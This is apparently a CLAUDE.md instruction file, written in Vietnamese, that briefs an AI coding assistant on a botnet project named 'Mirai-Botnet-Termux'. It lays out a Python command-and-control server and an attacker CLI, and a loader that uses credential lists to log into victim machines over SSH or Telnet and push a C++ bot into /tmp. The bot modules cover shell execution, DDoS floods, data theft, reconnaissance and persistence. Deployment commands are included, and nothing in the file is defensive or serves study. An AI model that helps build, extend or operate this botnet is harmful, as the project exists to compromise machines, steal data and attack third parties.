=# CLAUDE.md — Mirai-Botnet-Termux

## Tổng quan dự án

Framework C2 (Command & Control) botnet viết bằng **Python (CNC)** + **C++ (Bot)**. CNC server chạy trên Termux/VPS của attacker. Bot là binary C++ static, triển khai lên máy nạn nhân qua SSH/Telnet loader + SCP.

## Kiến trúc

```
[MÁY ATTACKER - Termux/VPS]                   [MÁY NẠN NHÂN]
─────────────────────────────                  ─────────────────
CNC Server (Python)                            Bot (C++ static binary)
├── server.py    ← lắng nghe bot kết nối       ├── client       ← kết nối CNC, nhận lệnh
├── cli.py       ← attacker điều khiển CNC (Rich UI)     ├── modules/     ← binary payload (shell, flood, ...)
└── loader.py    ← SSH/Telnet + SCP triển khai └── persistence  ← tự cài vào hệ thống
```

### Flow triển khai bot

```
loader.py đọc file ip:port:user:pass
    │
    ├─→ SSH/Telnet vào từng máy
    ├─→ SCP upload binary bot lên /tmp/
    ├─→ SSH execute: chmod +x && chạy binary
    └─→ Bot kết nối ngược về CNC server
```

### Flow vận hành

```
cli.py ──(TCP/SSH)──→ server.py ──(TCP, AES-GCM)──→ Bot trên máy nạn nhân
   │                           │
   │  bots list                ├── quản lý pool bot
   │  bots count               ├── dispatch lệnh
   │  bot info <id>            ├── thu kết quả
   │                           └── theo dõi OS/arch/hostname từng bot
```

### Theo dõi bot

Khi bot kết nối lần đầu, nó gửi system info cho CNC server:

```
Bot gửi:  { "os": "Linux", "os_version": "Ubuntu 22.04",
            "arch": "x86_64", "kernel": "5.15.0-91",
            "hostname": "victim-pc" }
Server:   Lưu vào SQLite, hiển thị qua CLI
```

CLI hỗ trợ:
```bash
[CNC]> bots list
  ID    OS            Arch      Hostname      IP              Status
  1     Ubuntu 22.04  x86_64    victim-pc     10.0.0.5        online
  2     Debian 11     aarch64   raspberry     192.168.1.99    online
  3     CentOS 7      x86_64    web-server    10.0.1.20       offline

[CNC]> bots count
  Total: 3 | Online: 2 | Offline: 1
  Ubuntu 22.04: 1 | Debian 11: 1 | CentOS 7: 1

[CNC]> bot info 1
  ID:       1
  OS:       Ubuntu 22.04
  Arch:     x86_64
  Kernel:   5.15.0-91-generic
  Hostname: victim-pc
  IP:       10.0.0.5
  Online:   yes
  First seen: 2026-05-25 12:30:00
  Last seen:  2026-05-25 14:22:00
```

## Công nghệ sử dụng

| Thành phần | Ngôn ngữ | Giải thích |
|-----------|----------|------------|
| CNC Server | Python 3.11+ | asyncio, AES-GCM, SQLite |
| CNC CLI | Python 3.11+ | Rich UI, TCP hoặc SSH để điều khiển |
| Loader | Python 3.11+ | SSH (paramiko) / Telnet (telnetlib3), SCP |
| Bot client | C++ (static) | Kết nối CNC, nhận lệnh, chạy module |
| Bot modules | C++ (static) | Binary compile sẵn: shell, flood, steal, recon |

**Tại sao bot dùng C++ static?**
- Máy nạn nhân thường không có Python, không có thư viện
- Static binary chạy trên mọi máy Linux mà không cần dependencies
- Cross-compile sẵn cho các kiến trúc: arm, aarch64, x86, x86_64, mips, mipsel

## Cấu trúc dự án

```
Mirai-Botnet-Termux/
├── server/                    # CNC — Python (chạy trên máy attacker)
│   ├── __init__.py
│   ├── server.py              # CNC server: lắng nghe bot, quản lý pool, dispatch lệnh
│   ├── cli.py                 # CLI cho attacker: Rich UI, kết nối TCP/SSH tới CNC
│   ├── cli_handler.py          # Shared command dispatch (dùng chung cho TCP CLI và SSH)
│   ├── ssh_cli.py              # SSH server: điều khiển CNC từ xa qua SSH
│   ├── loader.py               # SSH/Telnet bulk loader: đọc ip:port:user:pass, SCP binary
│   ├── handler.py             # Xử lý giao thức từng bot: auth, gửi/nhận message
│   ├── db.py                  # SQLite: bot list, command history, kết quả
│   └── commands.py            # Định nghĩa lệnh gửi tới bot (shell, flood, ...)
├── bot/                       # Bot — C++ (triển khai lên máy nạn nhân)
│   ├── Makefile               # Build tất cả binary, cross-compile
│   ├── client.cpp             # Bot chính: kết nối CNC, auth, vòng lặp nhận lệnh
│   ├── common.h               # Shared header: protocol, crypto, utils
│   ├── modules/
│   │   ├── shell.cpp          # Thực thi lệnh shell
│   │   ├── flood.cpp          # DDoS (TCP/UDP/HTTP flood) — tham khảo @/storage/emulated/0/Project/ddos/pps.cpp
│   │   ├── steal.cpp          # Đánh cắp dữ liệu
│   │   └── recon.cpp          # Trinh sát hệ thống
│   └── persistence.cpp        # Tự cài persistence (cron, rc.local, systemd)
├── shared/                    # Python shared cho CNC (protocol + crypto)
│   ├── __init__.py
│   ├── protocol.py            # Message types, framing
│   └── crypto.py              # AES-GCM encrypt/decrypt
├── scripts/
│   ├── setup.sh               # Cài dependencies cho CNC (Termux)
│   ├── build_bot.sh           # Cross-compile bot binary cho tất cả kiến trúc
│   └── cross-toolchains/      # Toolchain cross-compile
├── tests/
│   ├── test_server/
│   └── test_shared/
├── config.example.yaml        # Cấu hình mẫu
├── targets.example.txt        # Mẫu file ip:port:user:pass cho loader
├── requirements.txt           # Python dependencies (dành cho CNC)
├── README.md
├── CLAUDE.md                  # File này
└── .claude/
    ├── rules/                 # 10 quy tắc bắt buộc
    └── agents/                # 5 sub-agents
```

## Build và chạy

### CNC Server (trên máy attacker)

```bash
# Cài dependencies
pkg install python rust binutils clang make
pip install -r requirements.txt

# Khởi động CNC server
python -m server.server --config config.yaml

# Mở CLI để điều khiển (terminal khác)
python -m server.cli

# Hoặc điều khiển từ xa qua SSH
ssh -o StrictHostKeyChecking=no -p 2222 admin@<cnc-server-ip>

# Triển khai bot hàng loạt (loader)
python -m server.loader --targets targets.txt --binary dist/bot.arm
```

### Bot (build rồi triển khai lên máy nạn nhân)

```bash
# Cross-compile cho tất cả kiến trúc
bash scripts/build_bot.sh

# Output:
#   dist/client.arm       (ARMv7)
#   dist/client.aarch64   (ARM64)
#   dist/client.x86       (32-bit)
#   dist/client.x86_64    (64-bit)
#   dist/client.mips      (MIPS big-endian)
#   dist/client.mipsel    (MIPS little-endian)
```

### Flow triển khai thực tế

```bash
# 1. Attacker khởi động CNC server
python -m server.server --config config.yaml &

# 2. Attacker mở CLI để điều khiển
python -m server.cli

# 3. Attacker dùng loader triển khai bot hàng loạt
#    targets.txt format: ip:port:user:pass
python -m server.loader --targets targets.txt --binary dist/client.aarch64

# 4. Bot trên máy nạn nhân tự kết nối về CNC, attacker dùng CLI ra lệnh
```

## Tài liệu kèm theo

- **[.claude/rules/](.claude/rules/)** — 10 quy tắc bắt buộc
- **[.claude/agents/](.claude/agents/)** — 5 sub-agents chuyên biệt
